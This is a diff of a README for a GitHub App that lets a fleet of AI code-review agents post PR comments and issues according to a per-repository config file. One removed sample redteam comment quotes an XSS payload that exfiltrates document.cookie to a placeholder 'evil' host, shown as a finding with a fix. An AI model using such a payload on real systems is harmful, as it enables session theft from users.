@@ -1,31 +1,93 @@
 # Port Daddy Fleet — GitHub App
 
-Until recently, "what the fleet thinks of your code" lived in a SQLite table on your laptop. Useful, kind of, the way the post-it on the back of your monitor is useful: visible to you, invisible to the rest of the world. The fleet would dutifully read a diff, find a bug, write a note, and that note would sit in `~/.port-daddy/notes.db` forever, like a letter in a drawer.
+Port Daddy Fleet is a GitHub App that lets a Port Daddy installation post
+findings to a repository: PR comments, review threads, issues, and draft
+pull requests. It is the bridge between the local fleet daemon and the
+shared surface where reviewers, contributors, and CI already look.
 
-This GitHub App moves the letters into the mailbox.
+The App has one GitHub identity (`port-daddy-fleet[bot]`). The fleet itself
+is **per-repository**. Each installed repo declares which agents (ships)
+should run, on which events, with which behavior, in its own
+[`pd-fleet.yml`](../../pd-fleet.yml). The App reads that file at dispatch
+time and posts as the requested ship by rendering a header tag
+(`**[pd-<ship>]**`) into the comment body.
 
-When you install **Port Daddy Fleet** on a repo, the seven ships — *reviewer, redteam, qa, test-author, tautology, unspider, documentarian* — start posting their findings as PR comments, review threads, issues, and (occasionally) draft PRs. One App; seven identities. Each comment is prefixed with `**[pd-reviewer]**`, `**[pd-redteam]**`, and so on, so you can tell at a glance which ship is talking and silence the ones you don't want — without uninstalling the App. The fleet stays out of your way until a commit lands, a PR opens, or a check fails; then the relevant ship leaves drydock, does one small specific thing, and ties back up.
+The roster is open. Three worked examples:
 
-It's a small piece of plumbing. The product is the *seven things at once* — review + redteam + QA + test-author + tautology-check + dead-code-hunt + doc-drift-check — done quietly enough that you can ignore the ones you don't care about today and read the ones you do.
+- **port-daddy** runs `reviewer`, `redteam`, `qa`, `test-author`,
+  `tautology`, `unspider`, and `documentarian`.
+- **expungement-guide** runs `upl-checker` (catches Unauthorized Practice
+  of Law in drafts), `citation-checker` (validates state-specific
+  citations), `plain-language` (Flesch-Kincaid + legalese), and
+  `accessibility`.
+- **windags** runs `skill-media` (generates hero illustrations for skill
+  dossiers), `mermaid-author` (draws diagrams referenced in copy), and
+  `skill-grammar` (lints SKILL.md frontmatter and required sections).
+
+See [`docs/per-project-ships.md`](docs/per-project-ships.md) for the
+schema, fragment examples, and how to introduce a new ship.
 
 ---
 
-## Why one App and not seven
+## Why one App and an open ship roster
 
-I considered shipping seven Apps (one per ship). It would be cuter — `pd-reviewer[bot]`, `pd-redteam[bot]`, each with its own avatar and its own row in your installations page. But seven installations is seven yeses, seven private keys, seven webhook endpoints, and seven things to revoke when you change your mind. Nobody is going to do that.
+The unit of install on GitHub is the App, not the agent. Seven Apps is
+seven private keys, seven webhook receivers, seven installations to grant
+and revoke. Operators do not do that.
 
-So: **one App, seven identities.** The differentiation lives in the body of every post — a header line, a unicode mark, a footer — and (eventually) in per-ship avatars rendered server-side. If GitHub ever ships per-message bot identity for Apps, we change the rendering layer and the call sites don't notice. Until then, the `[pd-ship]` prefix is the contract.
+One App with a body-rendered identity gets all the differentiation that
+matters — readers can scan a thread and tell `pd-reviewer` apart from
+`pd-redteam` at a glance, can mute one ship without uninstalling, and can
+introduce new ships per repository without registering anything with
+GitHub.
+
+A closed enum of ships hardcoded into this App was an earlier design.
+That design did not survive contact with the second repository. A legal
+content site needs Unauthorized Practice of Law checks. A media-heavy
+documentation site needs an illustration generator. Neither belongs in a
+GitHub App's source tree. Both belong in the installed repo's own config.
 
 ---
 
-## Install on your repo
+## How dispatch works
 
-The App isn't registered yet. Once it is, the install flow is:
+```
+GitHub webhook
+      │
+      ▼
+App receiver (operator-hosted)
+      │
+      ▼
+Read installed repo's pd-fleet.yml via contents:read
+      │
+      ▼
+For each ship whose `trigger:` matches the event:
+      │
+      ▼
+postAs(shipMeta, operation)  ──►  GitHub API as port-daddy-fleet[bot]
+                                  with **[pd-<ship>]** header
+```
 
-1. Visit `https://github.com/apps/port-daddy-fleet` *(placeholder — operator updates this after registration)*.
-2. Click **Install**, pick the repos you want the fleet to see.
-3. GitHub redirects to `https://portdaddy.dev/github/app/installed?installation_id=...` — copy the `installation_id` value from the URL.
-4. Stash three secrets in the repo (or wherever your fleet runtime lives — Cloudflare Workers env, `.env.local`, your secret manager of choice):
+`postAs` is the only entry point. Its signature accepts a `ShipMeta`
+value the caller has resolved (handle, role, optional mark) — there is no
+closed list of ships in the App code. See
+[`lib/post-as.ts`](lib/post-as.ts) for the type.
+
+---
+
+## Install on your repository
+
+The App is not yet registered on github.com. Once it is, the flow is:
+
+1. Visit `https://github.com/apps/port-daddy-fleet`. (Placeholder slug;
+   the operator updates this after registration.)
+2. Click **Install**, then pick the repositories you want the fleet to
+   reach.
+3. GitHub redirects to
+   `https://portdaddy.dev/github/app/installed?installation_id=...`. Copy
+   the `installation_id` from the URL.
+4. Set three secrets in the runtime that posts on the App's behalf
+   (Cloudflare Workers env, your secret manager, or `.env.local` in dev):
 
    ```bash
    GITHUB_APP_ID=...                  # numeric, visible on the App settings page
@@ -33,7 +95,12 @@ The App isn't registered yet. Once it is, the install flow is:
    GITHUB_APP_INSTALLATION_ID=...     # per-repo, from step 3
    ```
 
-5. From your fleet runtime, verify auth with one round-trip:
+5. Add a `pd-fleet.yml` to the installed repository at the path the
+   runtime is configured to read (default: repository root). See
+   [`docs/per-project-ships.md`](docs/per-project-ships.md) for the
+   schema.
+
+6. Verify auth from the runtime:
 
    ```ts
    import { getOctokitForInstallation } from 'apps/github-app-fleet/lib/auth'
@@ -42,63 +109,52 @@ The App isn't registered yet. Once it is, the install flow is:
    console.log(me.data.slug) // -> port-daddy-fleet
    ```
 
-If that prints the slug, you're in. The next PR opened on the repo will get a comment from whichever ships your fleet config has armed.
+If that prints the slug, auth is live. The next event that matches a
+configured ship's `trigger:` produces a post.
 
-> **Note for the operator (you).** You are the App owner. Don't share the private key. Rotate it via the App settings page and re-deploy the env if a runtime ever leaks one. The installation ID is fine to put in plaintext config — it doesn't grant anything by itself.
+The private key is the credential that lets the App act as the bot. Treat
+it like any other production secret: rotate via the App settings page,
+re-deploy the env if a runtime leaks one. The installation ID is not
+sensitive on its own.
 
 ---
 
-## What you'll see
+## Comment shape
 
-Each ship has a recognizable shape on the page. Pseudo-screenshots, in order of how often you'll see them:
+Every post the App makes carries the same envelope. The differences
+between ships are confined to the header line and the body content.
 
-### `pd-reviewer` (◆) — careful colleague reading your diff
+```
+**[pd-<ship>]** <mark>  _<role>_
 
-> **[pd-reviewer]** ◆ *reads diffs like a careful colleague*
->
-> The new `claimPort` path in `lib/ports.ts` doesn't release the lock on the early-return at line 88. Two callers (`/claim` and `/with-lock`) hit that branch when a port is already claimed by the same identity; in both, the lock taken on line 71 is held until the next claim by that identity (or daemon restart). Small bug, big bill.
->
-> *Suggested fix:* hoist the release into a `try/finally`, or invert the branch so the early-return happens before the lock is taken.
->
-> <sub>posted by the Port Daddy fleet — `pd-reviewer`</sub>
+<body>
 
-### `pd-redteam` (▲) — the worst-case reader
+<sub>posted by the Port Daddy fleet — `pd-<ship>` · [silence this ship](https://portdaddy.dev/docs/fleet/silence)</sub>
+```
 
-> **[pd-redteam]** ▲ *assumes the worst; looks for sharp edges*
->
-> The `/sugar/begin` route accepts a `purpose` field as free text and stores it directly in SQLite — fine — but the dashboard renders it via `innerHTML` on the Sugar Context panel. A purpose string of `<img src=x onerror=fetch('//evil/'+document.cookie)>` would run in any session viewing the dashboard. Not exploitable across the network (daemon is loopback-only) but very exploitable across multi-user dev machines.
->
-> *Suggested fix:* `textContent`, not `innerHTML`. Or render through a known sanitizer.
+- `pd-<ship>` matches the ship's `handle` in `pd-fleet.yml`.
+- `<mark>` is an optional unicode primitive (geometric only — no emoji).
+- `<role>` is the ship's one-line role description.
+- The signed footer carries a link to the per-ship silence flow, which
+  toggles the runtime off without affecting the App installation.
 
-### `pd-qa` (●) — the missing-coverage scanner
-
-> **[pd-qa]** ● *runs tests in its head; flags missing coverage*
->
-> The new `mergeQueueExecutor` got 412 lines and 0 tests. The closest test file (`tests/unit/merge-queue.test.js`) covers the queue, not the executor. Three branches I can't see being exercised: timeout on a stuck merge, retry on a transient git fetch failure, and the "no orchestrator plugin registered" fallback.
->
-> *Suggested fix:* `pd-test-author` can take a swing at this if you want — react with 🚢 and I'll dispatch.
-
-### `pd-test-author` (✚) — writes the missing test, opens a draft PR
-
-> **[pd-test-author]** ✚ *writes the test that was missing*
->
-> Picked up the missing executor coverage flagged by `pd-qa`. Drafted three test cases covering the timeout, retry, and unregistered-plugin paths. Each is < 40 lines. Drafted as a PR, not pushed to your branch: you decide.
->
-> See the draft PR linked above.
-
-### `pd-tautology` (◇), `pd-unspider` (◐), `pd-documentarian` (✦)
-
-These three are quieter — they post less, and usually as issue comments, not as PR review comments. The shapes are the same: `**[pd-ship]** mark *role*` header, body, signed footer.
-
-A live screenshot gallery lives at `https://portdaddy.dev/docs/fleet/gallery` *(deploys with v3.16; until then, the words above are what you get)*.
+The framing is implemented in `frameBody(ship, body)` and is idempotent.
+Bodies that already start with the same `**[pd-<handle>]**` prefix are
+returned unchanged, so a body composed through framing can be passed
+through framing again safely.
 
 ---
 
 ## Cost expectations
 
-The fleet runs locally by default — Llama 3.1 8B for `reviewer` and `qa`, Qwen for the writing-heavy ships (`test-author`, `documentarian`). Those are free at the marginal-token level.
+The fleet runs locally by default. Most ships use Llama 3.1 8B or a
+similar small model. The writing-heavy ships (test authors, image
+generators, document drafters) use larger models. None of that is fixed
+by this App; the per-ship backend is set in the installed repo's
+`pd-fleet.yml`.
 
-When you flip a ship to Claude, the model+spend table lives in `docs/fleet/cost-table.md` *(operator: link this once the doc lands)*. Rough numbers from the dogfood week:
+Rough numbers from `port-daddy`'s own fleet over a dogfood week, all
+seven ships on Anthropic Claude Haiku:
 
 | Ship             | Default backend         | Cloud cost / PR (Claude Haiku) |
 |------------------|-------------------------|--------------------------------|
@@ -110,15 +166,35 @@ When you flip a ship to Claude, the model+spend table lives in `docs/fleet/cost-
 | unspider         | local (llama 8B)        | ~$0.002                        |
 | documentarian    | local (qwen)            | ~$0.008                        |
 
-A noisy PR-heavy week with all seven on Haiku came out to under a dollar across a single repo. Sonnet roughly 10× that; Opus roughly another 5× on top. The operator-side knob is `PD_FLEET_BACKEND` per ship.
+A PR-heavy week with all seven on Haiku came in under one US dollar for
+one repository. Sonnet is roughly ten times that; Opus is roughly five
+times Sonnet. The `port-daddy:fleet` daemon enforces per-day budget caps
+declared in `pd-fleet.yml > fleet.limits.budget_usd_per_day`. The App is
+not the budget enforcer; it is the surface.
+
+Other repositories' ships have their own cost shapes. A `skill-media`
+ship that generates images is not measured in tokens — it is measured in
+image-generation calls, which the runtime budgets separately.
 
 ---
 
-## Killing the fleet
+## Silencing the fleet
 
-`pd fleet down` stops the local runners. The App stays installed on the repo — quiet, no posts — until you bring the runners back up. That's the intentional default: uninstalling and reinstalling an App with commit-adjacent permissions is more friction than turning off a daemon, and you should be able to silence the fleet for a week without re-doing the trust dance.
+`pd fleet down` stops the local runners. The App stays installed; no
+posts arrive. This is the intentional default: uninstalling and
+reinstalling a GitHub App is meaningful friction, and an operator should
+be able to silence the fleet for a week without re-doing the trust
+exchange.
 
-If you want the App actually gone, that's the repo's **Settings → Integrations → GitHub Apps → Configure → Uninstall** flow. Revokes everything.
+To remove the App entirely, use **Settings → Integrations → GitHub Apps
+→ Configure → Uninstall** on the repository or organization. This
+revokes the installation token, removes the per-repo permission grant,
+and detaches the App from all webhooks for that installation.
+
+To silence a single ship without taking the fleet down, set `enabled:
+false` on that ship's block in `pd-fleet.yml` and let the next webhook
+re-read the config. The App does not maintain its own enable/disable
+state — the YAML is the source of truth.
 
 ---
 
@@ -130,8 +206,10 @@ apps/github-app-fleet/
 ├── README.md              # this file
 ├── CHANGELOG.md
 ├── lib/
-│   ├── auth.ts            # JWT + installation-token mgmt, with caching
+│   ├── auth.ts            # JWT + installation-token management, with caching
 │   └── post-as.ts         # postAs(ship, operation) — single entry point
+├── docs/
+│   └── per-project-ships.md   # per-repo pd-fleet.yml schema + worked examples
 ├── icons/                 # three direction concepts × three sizes
 │   ├── A-lighthouse/
 │   ├── B-anchor/
@@ -142,30 +220,44 @@ apps/github-app-fleet/
 
 ---
 
-## What's still an operator-only call
+## What still needs operator action
 
-I held off on these — they're yours:
+These are not code decisions. They are owned by the App's account-holder:
 
-- The **App slug** (the URL `github.com/apps/<slug>`). I assumed `port-daddy-fleet`; you may want shorter.
-- The **webhook URL** in `manifest.json`. Set to a placeholder; you decide which receiver gets the events (Cloudflare Worker, Fly, your laptop via smee, etc).
-- The **redirect / setup / callback URLs**. Defaulted to `portdaddy.dev/github/app/*`; if you host the install-experience pages elsewhere, swap them.
-- Which **icon direction** to ship. The icons/ folder has three concepts; pick one when you register the App.
-- Whether the App is **registered to your personal account** (curiositech-personal) or to a **Curiositech organization**. The latter is probably right for a public App; the former is fine while it's private.
-- Actually clicking **Create GitHub App from manifest**. That's a 60-second action that creates the App, but it cannot be reversed by code, so I'm not doing it. See "Time budget" below.
+- The **App slug** (the URL `github.com/apps/<slug>`). This README
+  assumes `port-daddy-fleet`. Shorter slugs are available.
+- The **webhook URL** in `manifest.json`. The placeholder is
+  `https://REPLACE_ME.portdaddy.dev/github/webhooks`. The receiver is a
+  deployment-time decision.
+- The **redirect, setup, and OAuth callback URLs**. The defaults are
+  `portdaddy.dev/github/app/*`. If the install-experience pages are
+  hosted elsewhere, swap them.
+- The **icon direction** to ship. `icons/` carries three concepts; one
+  must be picked before the App is registered.
+- Whether the App is **registered to a personal account** or to a
+  **Curiositech organization**. The organization is the right home for a
+  public App; the personal account is fine while it is private.
+- **Running the manifest-create flow.** That mints the private key and
+  the App ID. It is a one-time, irreversible action and is not part of
+  this scaffolding.
+
+---
 
 ## Time budget
 
-Roughly what you should expect to spend, end-to-end, with this manifest in hand:
+Roughly, end-to-end, starting from this manifest:
 
 | Step                                                                       | Time          |
 |----------------------------------------------------------------------------|--------------:|
 | Pick an icon direction from `icons/`                                       | 2 min         |
-| Decide on the App slug + which account owns it                             | 2 min         |
+| Decide the App slug and account                                            | 2 min         |
 | Set up a webhook receiver (smee for dev, Worker for prod)                  | 5–15 min      |
 | Open `github.com/settings/apps/new?manifest=...` and paste                 | 1 min         |
 | Save the generated private key, App ID, and installation ID                | 2 min         |
-| Drop the three env vars into your fleet runtime                            | 3 min         |
+| Add the three env vars to the runtime                                      | 3 min         |
+| Add `pd-fleet.yml` to the first installed repository                       | 5–10 min      |
 | First round-trip test (`getOctokitForInstallation` → `apps.getAuthenticated`) | 2 min     |
-| **Total (no surprises)**                                                   | **~20–30 min** |
+| **Total**                                                                  | **~25–40 min** |
 
-If you've never set up an App before, double that. If you have, this is a coffee.
+First-time App registration adds another 15–30 minutes of GitHub-side
+navigation. Subsequent installs are routine.
